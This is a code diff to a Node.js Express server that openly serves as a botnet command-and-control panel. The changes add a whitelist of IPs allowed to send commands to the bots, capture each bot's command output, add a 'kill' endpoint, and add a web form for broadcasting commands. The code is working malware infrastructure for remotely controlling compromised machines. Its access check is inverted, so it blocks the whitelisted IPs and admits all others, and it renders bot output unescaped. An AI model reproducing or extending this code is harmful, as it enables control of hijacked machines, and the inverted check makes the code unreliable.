@@ -13,6 +13,10 @@ app.use(bodyParser.json());
 
 //Some global vars
 var bots = [];
+var whitelist = [ //List of IP's that can send commands to the botnet
+"::ffff:127.0.0.1",
+"::ff"
+];
 
 //*****Express routing*****
 app.get('/', function (req, res) {
@@ -46,6 +50,7 @@ app.post('/heartbeat', function(req, res) {
 			actualBot = bots[i];
 			console.warn("Received heartbeat from  " + req.ip);
 			bots[i].status = req.body.status;
+			bots[i].stdout = req.body.lastOut;
 			if (!bots[i].online) {
 				console.warn(bots[i].ip + " is no longer stale, set as online")
 				bots[i].online = true;
@@ -63,7 +68,8 @@ app.post('/heartbeat', function(req, res) {
 			status: req.body.status, //This is part of the post that they send us
 			lastHeartbeat: Date().toLocaleString(),
 			outstandingWork: false,
-			command: ""
+			command: "",
+			stdout: ""
 		};
 		handleNew(bot);
 		res.send("added"); 
@@ -87,8 +93,9 @@ app.post('/heartbeat', function(req, res) {
 //We POST here to send new commands to the botnet
 app.post('/command', function(req, res) {
 	//Let's make sure nobody else can post here except us
-	if (req.ip != "::ffff:127.0.0.1") {
+	if (whitelist.includes(req.ip)) {
 		res.status(403).send('Forbidden');
+		console.log("Denied command call from " + req.ip);
 	} else {
 		console.log("New command received: " + req.body.command);
 		console.log("Broadcasting to bots");
@@ -106,6 +113,16 @@ app.get('/command', function(req, res) {
 			res.send(bots[i].command);
 		}
 	}
+});
+
+//Allow us to kill all current child processes on our bots as a loop safety measure
+app.post('/kill', function(req, res) {
+	console.log("Setting all processes to kill");
+	for (var i = 0; i < bots.length; i++) {
+			bots[i].outstandingWork = true;
+			bots[i].command = "kill";
+	}
+	res.send("Killed all bots child processes");
 });
 
 //Check every 10s to make sure our bots are up to date
@@ -133,7 +150,7 @@ app.listen(3000, function () {
 function genTable() {
 	var tableHTML = headerTable;
 	for (var i = 0; i < bots.length; i++) {
-		tableHTML += tableContentGen(bots[i].ip, bots[i].online, bots[i].status, bots[i].lastHeartbeat, bots[i].outstandingWork, bots[i].command);
+		tableHTML += tableContentGen(bots[i].ip, bots[i].online, bots[i].status, bots[i].lastHeartbeat, bots[i].outstandingWork, bots[i].command, bots[i].stdout);
 	}
 	tableHTML += footerTable;
 	return tableHTML;
@@ -148,10 +165,11 @@ var headerTable = `
     <th>Last Heartbeat</th>
     <th>Work Available</th>
     <th>Last Command</th>
+    <th>Last Output</th>
   </tr>
 `;
 
-function tableContentGen(ip, online, status, lhb, work, cmd) {
+function tableContentGen(ip, online, status, lhb, work, cmd, stdout) {
 	return ` 
 	<tr>
     <td>${ip}</td>
@@ -160,7 +178,15 @@ function tableContentGen(ip, online, status, lhb, work, cmd) {
     <td>${lhb}</td>
     <td>${work}</td>
     <td>${cmd}</td>
+    <td>${stdout}</td>
   </tr>`
 }
 
-var footerTable = "</table>";
+var footerTable = `</table><br><br>
+<form action="command" method="post">
+  Command: <input type="text" name="command" length=100><br>
+  <input type="submit" value="Submit">
+</form><br><br>
+	<form action="kill" method="post">
+	<input type="submit" value="Kill all processes">
+</form>`;
